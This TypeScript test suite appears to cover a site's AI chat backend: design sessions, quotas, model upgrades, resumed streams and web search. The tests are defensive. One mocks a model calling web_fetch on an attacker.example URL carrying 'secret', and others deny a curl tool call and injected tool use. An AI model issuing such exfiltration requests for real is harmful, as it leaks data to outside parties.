  const questions = [{ header: "内容", question: "卡片显示多少内容？", multiSelect: false, options: [{ label: "只显示概况", description: "最简单" }, { label: "概况加展柜", description: "要维护对照表" }] }];
  const bad = [{ ...questions[0], options: [questions[0].options[0]] }];
  const { env, sent, sessions } = designEnv({ turns: [[
    agent.running,
    agent.tool("tu_curl", "bash", { command: "curl https://example.com" }, "ask"),
    agent.custom("ctu_status", "get_site_status", { views: ["timezone"] }),
    agent.custom("ctu_plan", "propose_build", { ...plan, paths: [".github/workflows/push.yml"] }),
    agent.custom("ctu_bad", "ask_visitor", { questions: bad }),
    agent.waiting("ctu_status", "ctu_plan", "ctu_bad"),
    agent.running,
    agent.custom("ctu_ask", "ask_visitor", { questions }),
    agent.waiting("ctu_ask"),
  ]] });
  const events = await parseEvents(await handleChat(chatRequest(await designToken(env, sessions)), env, toolIO));
  const replies = sent.slice(1);
  assert.deepEqual(replies.map((event) => [event.type, event.tool_use_id ?? event.custom_tool_use_id, event.result ?? event.is_error]), [
    ["user.tool_confirmation", "tu_curl", "deny"],
    ["user.custom_tool_result", "ctu_status", false],
    ["user.custom_tool_result", "ctu_plan", true],
    ["user.custom_tool_result", "ctu_bad", true],
  ]);
  assert.match(JSON.stringify(replies[1]), /Asia\/Singapore/);
  assert.ok(events.some((event) => event.type === "tool" && event.views.includes("timezone")));
  assert.deepEqual(events.filter((event) => event.type === "ask"), [{ type: "ask", questions }]);
  assert.ok(!events.some((event) => event.type === "plan"));
  assert.equal(textOf(events), "请在下面选一下。");
  const seal = events.find((event) => event.type === "seal");
  assert.ok(seal?.type === "seal" && seal.trace?.views?.includes("timezone"));
});

test("断线补发：会话已停在等访客时，从访客那条回答起重推错过的文字、读过的文件和题目并盖章，不发事件给会话也不扣轮数", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const questions = [{ header: "Scope", question: "How much should the card show?", multiSelect: false, options: [{ label: "Summary", description: "Simplest" }, { label: "Showcase", description: "More work" }] }];
  const { env, sent, sessions, counters } = designEnv({ history: [
    agent.visitor("sevt_old", "Earlier message."),
    ...agent.say("sevt_old_reply", "Earlier reply.").slice(2),
    agent.result("sevt_kick", "ctu_prev", "The visitor replied:\nMake it smaller."),
    agent.running,
    agent.tool("tu_read", "read", { file_path: "/workspace/lyjwpage/src/components/live/music-card.tsx" }),
    agent.custom("ctu_status", "get_site_status", { views: ["timezone"] }),
    agent.result("sevt_status", "ctu_status", "{\"timezone\":\"Asia/Singapore\"}"),
    ...agent.say("sevt_m", "One question first.").slice(2),
    agent.custom("ctu_ask", "ask_visitor", { questions }),
    agent.waiting("ctu_ask"),
  ] });
  const token = await designToken(env, sessions);
  const messages: GodChatMessage[] = [{ role: "user", content: "Make it smaller." }];
  const events = await parseEvents(await handleChat(chatRequest(token, messages, true), env, toolIO));
  assert.equal(textOf(events), "One question first.");
  assert.ok(events.some((event) => event.type === "doc" && event.path === "src/components/live/music-card.tsx"));
  assert.deepEqual(events.filter((event) => event.type === "ask"), [{ type: "ask", questions }]);
  assert.ok(events.some((event) => event.type === "design" && event.remaining === BUILD_DESIGN_LIMITS.maxTurns - 1));
  const seal = events.find((event) => event.type === "seal");
  assert.ok(seal?.type === "seal");
  assert.equal((await sealedHistory([...messages, { role: "assistant", content: textOf(events), seal: seal.seal, trace: seal.trace }, { role: "user", content: "Summary." }], env.CHAT_HISTORY_SECRET!)).length, 3);
  assert.deepEqual(sent, []);
  assert.deepEqual({ admitted: counters.admitted, peeked: counters.peeked }, { admitted: 0, peeked: 1 });
});

test("断线补发：回合还在跑时先重推已有的，再跟着事件流到停下，重复的事件只推一次；挂起的计划重新签发", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const first = agent.say("sevt_m1", "Reading the card.");
  const { env, sent, sessions } = designEnv({
    history: [agent.visitor("sevt_kick", "Shorten the label."), agent.running, first[2]],
    turns: [[first[2], agent.tool("tu_grep", "grep", { pattern: "label" }), ...agent.say("sevt_m2", "Here is the plan."), agent.custom("ctu_plan", "propose_build", plan), agent.waiting("ctu_plan")]],
  });
  const events = await parseEvents(await handleChat(chatRequest(await designToken(env, sessions), [{ role: "user", content: "Shorten the label." }], true), env, toolIO));
  assert.equal(textOf(events), "Reading the card.\n\nHere is the plan.");
  assert.deepEqual(events.filter((event) => event.type === "step").map((event) => event.type === "step" && event.text), ["Searched the code for “label”"]);
  const proposed = events.find((event) => event.type === "plan");
  assert.ok(proposed?.type === "plan");
  assert.deepEqual((await readPlan(env, proposed.token))?.plan, plan);
  const seal = events.find((event) => event.type === "seal");
  assert.ok(seal?.type === "seal" && seal.planToken === proposed.token);
  assert.deepEqual(sent, []);
});

test("断线补发：最近一回合不是访客最新那条消息时拒绝，不重推上一回合；没有设计令牌的补发请求无效", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env, sessions, counters } = designEnv({ history: [agent.visitor("sevt_kick", "Earlier message."), ...agent.say("sevt_m", "Earlier reply.").slice(2), agent.idle({ type: "end_turn" })] });
  const response = await handleChat(chatRequest(await designToken(env, sessions), [{ role: "user", content: "A message that never arrived." }], true), env, toolIO);
  assert.equal(response.status, 409);
  assert.equal((await response.json() as { code: string }).code, "nothing_to_resume");
  assert.equal(counters.streams, 0);
  assert.equal((await handleChat(chatRequest(undefined, undefined, true), env, toolIO)).status, 400);
});

test("规划者到预算上限时说明并结束；会话被终止时不盖章", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const budget = designEnv({ turns: [[agent.running, ...agent.say("sevt_m", "Reading."), agent.idle({ type: "budget_reached" })]] });
  const capped = await parseEvents(await handleChat(chatRequest(await designToken(budget.env, budget.sessions)), budget.env, toolIO));
  assert.match(textOf(capped), /used its budget/);
  assert.ok(capped.some((event) => event.type === "seal"));
  const ended = designEnv({ turns: [[agent.running, { type: "session.status_terminated", id: "sevt_end", processed_at: at }]] });
  const terminated = await parseEvents(await handleChat(chatRequest(await designToken(ended.env, ended.sessions)), ended.env, toolIO));
  assert.match(textOf(terminated), /has ended/);
  assert.ok(!terminated.some((event) => event.type === "seal"));
});

test("服务器没配设计会话时，设计请求照常交给 think，提示词改说暂时做不了，不承诺再发一条能开", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const on = designEnv();
  await parseEvents(await handleChat(chatRequest(), on.env, toolIO));
  assert.ok(!JSON.stringify(on.requests[0]).includes("Design sessions are switched off"));
  assert.ok(on.requests[0].tools?.some((tool) => "name" in tool && tool.name === "start_design"));
  const off = designEnv();
  delete off.env.BUILD_SESSION_SECRET;
  const events = await parseEvents(await handleChat(chatRequest(), off.env, toolIO));
  assert.ok(JSON.stringify(off.requests[0]).includes("Design sessions are switched off"));
  assert.ok(!off.requests[0].tools?.some((tool) => "name" in tool && tool.name === "start_design"));
  assert.equal(off.counters.created, 0);
  assert.ok(events.some((event) => event.type === "seal"));
});

test("think 可以不开设计会话；模型未获授工具不能偷开会话或提计划；建会话失败时 think 自己答完", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  for (const tool of [false, { name: "propose_build", input: plan }, { name: "draft_github_issue", input: { title: "Injected", body: "Injected" } }]) {
    const { env, counters, created } = designEnv({ reply: (body, index) => modelStream(body.model, index === 0 ? tool : false) });
    const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
    assert.equal(counters.created, 0);
    assert.equal(counters.admitted, 0);
    assert.equal(created.length, 0);
    assert.ok(!events.some((event) => event.type === "plan" || event.type === "design"));
    assert.ok(events.some((event) => event.type === "seal"));
  }
  const { env, requests, counters } = designEnv({ createFails: true, reply: (body, index) => modelStream(body.model, index === 0 ? { name: "start_design", input: {} } : false) });
  const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
  assert.equal(counters.created, 1);
  assert.equal(counters.admitted, 0);
  assert.equal(counters.streams, 0);
  assert.equal(requests.length, 2);
  const results = requests[1].messages.at(-1)?.content;
  assert.ok(Array.isArray(results) && results.some((block) => block.type === "tool_result" && block.is_error));
  assert.ok(!events.some((event) => event.type === "design"));
  assert.equal(events.find((event) => event.type === "seal")?.type === "seal" && (events.find((event) => event.type === "seal") as { trace?: { tier?: string } }).trace?.tier, "think");
});

test("有效设计会话跳过 Clef 与普通档位额度，每轮先扣专属额度，伪造、过期、缺会话、耗尽都不碰模型", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env, requests, counters, sessions } = designEnv({ turns: [[agent.running, ...agent.say("sevt_m", "Ok."), agent.idle({ type: "end_turn" })]] });
  const token = await designToken(env, sessions);
  const id = [...sessions.keys()][0];
  const response = await handleChat(chatRequest(token), env, toolIO);
  assert.equal(response.status, 200);
  const events = await parseEvents(response);
  assert.ok(events.some((event) => event.type === "design" && event.remaining === BUILD_DESIGN_LIMITS.maxTurns - 2));
  assert.deepEqual(counters, { visitor: 0, tier: 0, clef: 0, created: 0, admitted: 1, streams: 1, peeked: 0 });
  for (const invalid of [
    `${token.slice(0, -2)}xx`,
    await signBuildToken({ kind: "design", id, expiresAt: Date.now() - 1, sessionId: "sesn_test" }, env.BUILD_SESSION_SECRET!),
    await signBuildToken({ kind: "design", id, expiresAt: Date.now() + 10000 }, env.BUILD_SESSION_SECRET!),
    await signBuildToken({ kind: "plan", id, expiresAt: Date.now() + 10000, sessionId: "sesn_test" }, env.BUILD_SESSION_SECRET!),
  ]) {
    const rejected = await handleChat(chatRequest(invalid), env, toolIO);
    assert.equal(rejected.status, 400);
    assert.equal((await rejected.json() as { code: string }).code, "design_session_expired");
  }
  sessions.delete(id);
  const expired = await handleChat(chatRequest(token), env, toolIO);
  assert.equal(expired.status, 400);
  assert.equal((await expired.json() as { code: string }).code, "design_session_expired");
  sessions.set(id, BUILD_DESIGN_LIMITS.maxTurns);
  const exhausted = await handleChat(chatRequest(token), env, toolIO);
  assert.equal(exhausted.status, 429);
  assert.equal((await exhausted.json() as { code: string }).code, "design_session_exhausted");
  assert.equal(counters.streams, 1);
  assert.equal(requests.length, 0);
  assert.equal(counters.visitor + counters.tier + counters.clef, 0);
});

test("服务端无视工具关闭继续返回调用也不能延长工具循环", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env, requests } = designEnv({ reply: (body) => modelStream(body.model, true) });
  const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
  assert.equal(requests.length, GOD_CHAT_LIMITS.maxToolRounds + 1);
  assert.deepEqual(requests.at(-1)?.tool_choice, { type: "none" });
  assert.ok(requests.slice(0, -1).every((request) => request.tool_choice === undefined));
  assert.ok(requests.at(-1)?.messages.some((m) => m.role === "system" && typeof m.content === "string" && m.content.startsWith("No tools remain")));
  assert.ok(events.some((event) => event.type === "text" && event.text.includes("ran out of steps")));
});

test("web_search 走 Worker 调搜索服务，DeepSeek 档拿纯文本结果、正文链到的页进来源；web_fetch 不读没出现过的 URL", async (t) => {
  const original = globalThis.fetch;
  const outbound: string[] = [];
  globalThis.fetch = async (input) => {
    const url = String(input);
    if (url.includes("api.exa.ai")) {
      outbound.push(url);
      return Response.json({ results: [{ url: "https://e.dev/page", title: "E", highlights: ["fact"] }] });
    }
    return unexpected();
  };
  t.after(() => { globalThis.fetch = original; });
  const calls = [
    { name: "web_search", input: { query: "deepseek pricing", category: "web" } },
    { name: "web_fetch", input: { url: "https://attacker.example/?q=secret" } },
  ];
  const { env, requests } = designEnv({
    reply: (body) => {
      const call = calls[requests.length - 1];
      if (call) return modelStream(body.model, call);
      const events = [
        { type: "message_start", message: { id: "msg_test", type: "message", role: "assistant", model: body.model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 0 } } },
        { type: "content_block_start", index: 0, content_block: { type: "text", text: "", citations: [] } },
        { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: "Cheap, per [E](https://e.dev/page)." } },
        { type: "content_block_stop", index: 0 },
        { type: "message_delta", delta: { stop_reason: "end_turn", stop_sequence: null }, usage: { output_tokens: 10 } },
        { type: "message_stop" },
      ];
      return new Response(events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""), { headers: { "Content-Type": "text/event-stream" } });
    },
  });
  env.EXA_API_KEY = "test-exa";
  const events = await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "How much is DeepSeek?" }]), env, toolIO));
  assert.equal(outbound.length, 1);
  const searchResult = requests[1].messages.at(-1)?.content;
  assert.ok(Array.isArray(searchResult) && searchResult[0].type === "tool_result" && typeof searchResult[0].content === "string" && searchResult[0].content.includes("URL: https://e.dev/page"));
  const fetchResult = requests[2].messages.at(-1)?.content;
  assert.ok(Array.isArray(fetchResult) && fetchResult[0].type === "tool_result" && fetchResult[0].is_error === true);
  assert.ok(events.some((event) => event.type === "search" && event.query === "deepseek pricing"));
  assert.deepEqual(events.find((event) => event.type === "sources"), { type: "sources", sources: [{ url: "https://e.dev/page", title: "E" }] });
});

function scriptedStream(model: string, blocks: Record<string, unknown>[], stop: string): Response {
  const events: Record<string, unknown>[] = [
    { type: "message_start", message: { id: "msg_test", type: "message", role: "assistant", model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 0 } } },
    ...blocks.flatMap((block, index): Record<string, unknown>[] => block.type === "text"
      ? [{ type: "content_block_start", index, content_block: { type: "text", text: "", citations: [] } }, { type: "content_block_delta", index, delta: { type: "text_delta", text: block.text } }, { type: "content_block_stop", index }]
      : [{ type: "content_block_start", index, content_block: { ...block, input: {} } }, { type: "content_block_delta", index, delta: { type: "input_json_delta", partial_json: JSON.stringify(block.input) } }, { type: "content_block_stop", index }]),
    { type: "message_delta", delta: { stop_reason: stop, stop_sequence: null }, usage: { output_tokens: 10 } },
    { type: "message_stop" },
  ];
  return new Response(events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""), {
    headers: { "Content-Type": "text/event-stream" },
  });
}

test("先写完答案再调 show_card、下一轮空收尾时不提示步数用完；查数据后空收尾仍提示", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  for (const [call, warned] of [
    [{ type: "tool_use", id: "tool_card", name: "show_card", input: { card: "nowListening" } }, false],
    [{ type: "tool_use", id: "tool_status", name: "get_site_status", input: { views: ["timezone"] } }, true],
  ] as const) {
    const { env, requests } = designEnv({
      reply: (body) => requests.length === 1
        ? scriptedStream(body.model, [{ type: "text", text: "Let me check." }, call], "tool_use")
        : scriptedStream(body.model, [], "end_turn"),
    });
    const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
    assert.equal(requests.length, 2);
    assert.equal(events.some((event) => event.type === "text" && event.text.includes("ran out of steps")), warned, call.name);
  }
});

test("汉字假名提问时点名不许改英文，有假名才说日文，英文不加", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  for (const [content, expected] of [["LYJW 现在在干什么？", "Chinese or Japanese"], ["今何時", "Chinese or Japanese"], ["今日の天気", "Japanese"], ["LYJWは今なにをしていますか？", "Japanese"], ["What is LYJW up to?", undefined]] as const) {
    const { env, requests } = designEnv();
    await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content }]), env, toolIO));
    const notes = requests[0].messages.filter((m) => m.role === "system" && typeof m.content === "string" && m.content.startsWith("The visitor's latest message is in"));
    assert.deepEqual(notes.map((m) => (m.content as string).match(/is in (.+?)\. /)?.[1]), expected ? [expected] : [], content);
  }
});

function upgradeEnv(thinkFree: boolean) {
  const requests: Anthropic.Beta.MessageCreateParamsStreaming[] = [];
  const admitted: { tier: string; allowDowngrade?: boolean }[] = [];
  const env: Env = {
    PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
    AI_DEV: "true",
    CHAT_FORCE_TIER: "flash",
    ANTHROPIC_API_KEY: "test-key",
    DEEPSEEK_API_KEY: "test-deepseek",
    TURNSTILE_SECRET_KEY: "test-turnstile",
    CHAT_HISTORY_SECRET: "test-seal",
    ALLOWED_ORIGINS: "https://lyjw.me",
    CHAT_QUOTA: binding<ChatQuota>({
      admitVisitor: async () => "ok" as const,
      admitTier: async (_ip, wanted, _enforce, allowDowngrade) => {
        admitted.push({ tier: wanted, allowDowngrade });
        return wanted === "think" && !thinkFree ? null : wanted;
      },
    }),
  };
  const fetch = deepseekFetch(async (request) => {
    const body = await request.json() as Anthropic.Beta.MessageCreateParamsStreaming;
    requests.push(body);
    return requests.length === 1 ? modelStream(body.model, { name: "request_upgrade", input: {} }) : modelStream(body.model, false);
  });
  return { env, requests, admitted, fetch };
}

test("Small Fry 调 request_upgrade 后整轮对话交给 Prophet：扣 think 名额、开思考、不带 Small Fry 的草稿、路由事件改成 Prophet", async (t) => {
  const original = globalThis.fetch;
  t.after(() => { globalThis.fetch = original; });
  const { env, requests, admitted, fetch } = upgradeEnv(true);
  globalThis.fetch = fetch;
  const events = await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "Prove that sqrt(2) is irrational." }]), env, toolIO));
  assert.deepEqual(admitted.map((entry) => entry.tier), ["flash", "think"]);
  assert.equal(admitted[1].allowDowngrade, false);
  assert.equal(requests.length, 2);
  assert.ok(requests[0].tools?.some((tool) => "name" in tool && tool.name === "request_upgrade"));
  assert.deepEqual(requests[0].thinking, { type: "disabled" });
  assert.equal(requests[1].model, GOD_CHAT_TIER_INFO.think.model);
  assert.deepEqual(requests[1].thinking, { type: "adaptive" });
  assert.ok(requests[1].tools?.every((tool) => !("name" in tool) || tool.name !== "request_upgrade"));
  assert.ok(requests[1].messages.every((message) => message.role !== "assistant"));
  const routes = events.filter((event) => event.type === "route");
  assert.deepEqual(routes.map((event) => event.tier), ["flash", "think"]);
  assert.ok(routes.every((event) => event.downgradedFrom === undefined));
  const seal = events.find((event) => event.type === "seal");
  assert.equal(seal?.trace?.tier, "think");
});

test("Claude 阵容里 Haiku 升档交给 Sonnet：扣 sonnet 名额，追加 Sonnet 的强度", async (t) => {
  const original = globalThis.fetch;
  t.after(() => { globalThis.fetch = original; });
  globalThis.fetch = async () => unexpected();
  const requests: Anthropic.Beta.MessageCreateParamsStreaming[] = [];
  const admitted: string[] = [];
  const respond = async (request: Request) => {
    const body = await request.json() as Anthropic.Beta.MessageCreateParamsStreaming;
    requests.push(body);
    return requests.length === 1 ? modelStream(body.model, { name: "request_upgrade", input: {} }) : modelStream(body.model, false);
  };
  const env: Env = {
    PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
    AI_DEV: "true",
    CHAT_FORCE_TIER: "haiku",
    ANTHROPIC_API_KEY: "test-key",
    DEEPSEEK_API_KEY: "test-deepseek",
    TURNSTILE_SECRET_KEY: "test-turnstile",
    CHAT_HISTORY_SECRET: "test-seal",
    ALLOWED_ORIGINS: "https://lyjw.me",
    CHAT_QUOTA: binding<ChatQuota>({
      admitVisitor: async () => "ok" as const,
      admitTier: async (_ip, wanted) => { admitted.push(wanted); return wanted; },
    }),
    ANTHROPIC_EGRESS: binding<AnthropicEgress>({ colo: async () => "KIX", fetch: respond }),
  };
  const events = await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "Prove that sqrt(2) is irrational." }]), env, toolIO));
  assert.deepEqual(admitted, ["haiku", "sonnet"]);
  assert.equal(requests[1].model, GOD_CHAT_TIER_INFO.sonnet.model);
  const efforts = requests[1].messages.filter((message) => message.role === "system" && "output_config" in message).map((message) => (message as { output_config: { effort: string } }).output_config.effort);
  assert.deepEqual(efforts, [GOD_CHAT_TIER_INFO.haiku.effort, GOD_CHAT_TIER_INFO.sonnet.effort]);
  assert.equal(events.find((event) => event.type === "seal")?.trace?.effort, GOD_CHAT_TIER_INFO.sonnet.effort);
});

test("Prophet 没有空位时 request_upgrade 回错误，Small Fry 自己答完", async (t) => {
  const original = globalThis.fetch;
  t.after(() => { globalThis.fetch = original; });
  const { env, requests, fetch } = upgradeEnv(false);
  globalThis.fetch = fetch;
  const events = await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "Prove that sqrt(2) is irrational." }]), env, toolIO));
  assert.equal(requests.length, 2);
  assert.deepEqual(requests[1].thinking, { type: "disabled" });
  assert.ok(requests[1].tools?.every((tool) => !("name" in tool) || tool.name !== "request_upgrade"));
  assert.deepEqual(events.filter((event) => event.type === "route").map((event) => event.tier), ["flash"]);
});

test("只用了检索 MCP 的回复也在签名 trace 里记搜索次数，流式块与最终块不重复计", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env } = designEnv({
    reply: (body) => scriptedStream(body.model, [
      { type: "mcp_tool_use", id: "mcptoolu_1", name: "searchGitHub", server_name: "grep-app", input: { query: "setAlarm" } },
      { type: "text", text: "Found it." },
    ], "end_turn"),
  });
  const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
  const seal = events.find((event) => event.type === "seal");
  assert.equal(seal?.type === "seal" && seal.trace?.searches, 1);
  assert.equal(events.filter((event) => event.type === "search").length, 1);
});

test("同一轮的多个搜索调用一起发出，结果按调用顺序回", async (t) => {
  const original = globalThis.fetch;
  let inFlight = 0;
  let peak = 0;
  globalThis.fetch = async (input) => {
    const url = String(input);
    if (!url.includes("api.exa.ai")) return unexpected();
    inFlight++;
    peak = Math.max(peak, inFlight);
    await new Promise((resolve) => setTimeout(resolve, 20));
    inFlight--;
    return Response.json({ results: [{ url: "https://e.dev/page", title: "E", highlights: ["fact"] }] });
  };
  t.after(() => { globalThis.fetch = original; });
  const { env, requests } = designEnv({
    reply: (body) => requests.length === 1
      ? scriptedStream(body.model, [
        { type: "tool_use", id: "tool_a", name: "web_search", input: { query: "a", category: "web" } },
        { type: "tool_use", id: "tool_b", name: "web_search", input: { query: "b", category: "news" } },
      ], "tool_use")
      : scriptedStream(body.model, [{ type: "text", text: "Done." }], "end_turn"),
  });
  env.EXA_API_KEY = "test-exa";
  await parseEvents(await handleChat(chatRequest(), env, toolIO));
  assert.equal(peak, 2);
  const results = requests[1].messages.at(-1)?.content;
  assert.ok(Array.isArray(results));
  assert.deepEqual(results.map((block) => block.type === "tool_result" && block.tool_use_id), ["tool_a", "tool_b"]);
});

test("示例问题跳过 Clef 按预设定档，示例或 Clef 判出的预取写成一轮已调过的工具、随第一次请求发出", async (t) => {
  const original = globalThis.fetch;
  const exa: typeof fetch = async (input) => String(input).includes("api.exa.ai")
    ? Response.json({ results: [{ url: "https://e.dev/news", title: "News", highlights: ["model launch"] }] })
    : unexpected();
  t.after(() => { globalThis.fetch = original; });
  const run = async (content: string, history: GodChatMessage[] = [], answers: Record<string, unknown> = { route: { choice: "flash" } }) => {
    const requests: Anthropic.Beta.MessageCreateParamsStreaming[] = [];
    const wanted: string[] = [];
    let clef = 0;
    const respond = async (request: Request) => {
      const body = await request.json() as Anthropic.Beta.MessageCreateParamsStreaming;
      requests.push(body);
      return modelStream(body.model, false);
    };
    globalThis.fetch = deepseekFetch(respond, exa);
    const env: Env = {
      PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
      ANTHROPIC_API_KEY: "test-key",
      EXA_API_KEY: "test-exa",
      DEEPSEEK_API_KEY: "test-deepseek",
      TURNSTILE_SECRET_KEY: "test-turnstile",
      CHAT_HISTORY_SECRET: "test-seal",
      ALLOWED_ORIGINS: "https://lyjw.me",
      AI: Object.assign({} as Ai, { run: async () => { clef++; return { answers }; } }),
      CHAT_QUOTA: binding<ChatQuota>({
        admitVisitor: async () => "ok" as const,
        admitTier: async (_ip, tier) => { wanted.push(tier); return tier; },
      }),
      ANTHROPIC_EGRESS: binding<AnthropicEgress>({ colo: async () => "KIX", fetch: respond }),
    };
    const events = await parseEvents(await handleChat(chatRequest(undefined, [...history, { role: "user", content }]), env, toolIO));
    return { events, requests, wanted, clef };
  };

  const news = await run("这周 AI 圈有什么大新闻？");
  assert.equal(news.clef, 0);
  assert.deepEqual(news.wanted, ["think"]);
  assert.equal(news.requests.length, 1);
  const [call, result] = news.requests[0].messages.slice(-2);
  assert.equal(call.role, "assistant");
  assert.ok(Array.isArray(call.content) && call.content[0].type === "thinking" && call.content[1].type === "tool_use" && call.content[1].name === "web_search");
  assert.ok(Array.isArray(result.content) && result.content[0].type === "tool_result" && typeof result.content[0].content === "string" && result.content[0].content.includes("URL: https://e.dev/news"));
  assert.ok(news.events.some((event) => event.type === "search"));
  assert.ok(news.requests[0].messages.some((message) => message.role === "system" && typeof message.content === "string" && message.content.includes("timeline visual")));
  assert.equal(news.requests[0].mcp_servers, undefined);
  assert.ok(news.requests[0].tools?.every((tool) => tool.type !== "mcp_toolset"));

  const status = await run("LYJW 闲下来都做些什么？");
  assert.equal(status.clef, 0);
  assert.deepEqual(status.wanted, ["flash"]);
  const statusCall = status.requests[0].messages.at(-2)?.content;
  assert.ok(Array.isArray(statusCall) && statusCall[0].type === "tool_use" && statusCall[0].name === "get_site_status");
  assert.ok(status.events.some((event) => event.type === "tool" && event.views.includes("listening")));

  const later = await run("LYJW 闲下来都做些什么？", [{ role: "user", content: "hi" }, { role: "assistant", content: "Done.", seal: await sealExchange("test-seal", "hi", "Done.", undefined) }]);
  assert.equal(later.clef, 1);
  assert.ok(later.requests[0].messages.every((message) => !Array.isArray(message.content) || message.content.every((block) => block.type !== "tool_use")));

  const routed = await run("他最近在听谁的歌", [], {
    route: { choice: "flash" },
    status: { choice: "listening", probabilities: { listening: 0.9 } },
    doc: { choice: "none", probabilities: { none: 0.95 } },
  });
  assert.equal(routed.clef, 1);
  const routedCall = routed.requests[0].messages.at(-2)?.content;
  assert.ok(Array.isArray(routedCall) && routedCall.length === 1 && routedCall[0].type === "tool_use" && routedCall[0].name === "get_site_status");
  assert.ok(routed.events.some((event) => event.type === "tool" && event.views.includes("listening")));
  assert.ok(routed.requests[0].messages.every((message) => message.role !== "system" || typeof message.content !== "string" || !message.content.includes("sample questions")));
});

test("开思考的 DeepSeek 档给没有思考块的工具调用补占位思考，关思考的档原样发", async (t) => {
  const original = globalThis.fetch;
  t.after(() => { globalThis.fetch = original; });
  for (const tier of ["think", "flash"] as const) {
    const requests: Anthropic.Beta.MessageCreateParamsStreaming[] = [];
    globalThis.fetch = deepseekFetch(async (request) => {
      const body = await request.json() as Anthropic.Beta.MessageCreateParamsStreaming;
      requests.push(body);
      return modelStream(body.model, false);
    });
    const env: Env = {
      PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
      ANTHROPIC_API_KEY: "test-key",
      DEEPSEEK_API_KEY: "test-deepseek",
      TURNSTILE_SECRET_KEY: "test-turnstile",
      CHAT_HISTORY_SECRET: "test-seal",
      AI: Object.assign({} as Ai, { run: async () => ({ answers: { route: { choice: tier }, status: { choice: "listening", probabilities: { listening: 0.9 } } } }) }),
      CHAT_QUOTA: binding<ChatQuota>({ admitVisitor: async () => "ok" as const, admitTier: async () => tier }),
    };
    await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "他最近在听谁的歌" }]), env, toolIO));
    const call = requests[0].messages.find((message) => message.role === "assistant");
    assert.ok(call && Array.isArray(call.content));
    assert.deepEqual(call.content.map((block) => block.type), tier === "think" ? ["thinking", "tool_use"] : ["tool_use"]);
  }
});
